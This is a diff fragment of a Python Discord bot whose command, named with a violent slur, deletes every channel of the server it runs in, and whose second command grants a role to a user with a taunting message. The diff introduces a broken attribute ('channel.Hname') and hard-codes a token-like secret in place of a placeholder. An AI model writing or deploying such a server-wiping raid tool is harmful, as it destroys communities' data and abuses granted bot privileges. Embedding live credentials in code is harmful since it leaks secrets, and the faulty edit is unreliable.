@@ -120,7 +120,7 @@ async def rape(ctx):
         for channel in list(ctx.message.server.channels):
             try:
                 await client.delete_channel(channel)
-                print (channel.name + " has been deleted in " + ctx.message.server.name)
+                print (channel.Hname + " has been deleted in " + ctx.message.server.name)
             except:
                 pass
         server = ctx.message.server
@@ -144,4 +144,4 @@ async def dab(ctx):
     await client.add_roles(user, role)
     print ("You're in buddy, now don't fuck it up")
 
-client.run("TOKEN") #Bot's Token Code Goes Here
+client.run("a2b5a242a98e3a333c6fa0a7a24c30fa1bc55da78e67cb7611c052707d0f8e56") #Bot's Token Code Goes Here
